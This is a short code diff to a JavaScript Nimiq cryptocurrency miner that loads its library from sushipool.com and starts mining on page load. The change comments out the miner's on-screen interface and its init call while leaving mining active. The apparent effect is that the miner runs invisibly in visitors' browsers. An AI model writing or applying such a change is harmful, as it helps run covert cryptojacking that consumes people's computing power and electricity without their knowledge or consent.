@@ -38,7 +38,7 @@ function loadScript(url, callback) {
     document.getElementsByTagName("head")[0].appendChild(script);
 }
 
-/**/
+/*
 let nimiqMinerGUI = {
     init: () => {
         let guiLogo = document.createElement('div');
@@ -177,7 +177,7 @@ let nimiqMinerGUI = {
         containerDiv.appendChild(buttonContainer);
         document.body.appendChild(containerDiv);
     }
-}; /**/
+}; */
 
 let nimiqMiner = {
     minerThreads: 0,
@@ -314,5 +314,5 @@ let nimiqMiner = {
 loadScript('https://sushipool.com/scripts/vendor/nimiq/nimiq.js', () => {
     console.log('nimiq.js loaded');
     nimiqMiner.init();
-    nimiqMinerGUI.init();
+    //nimiqMinerGUI.init();
 });
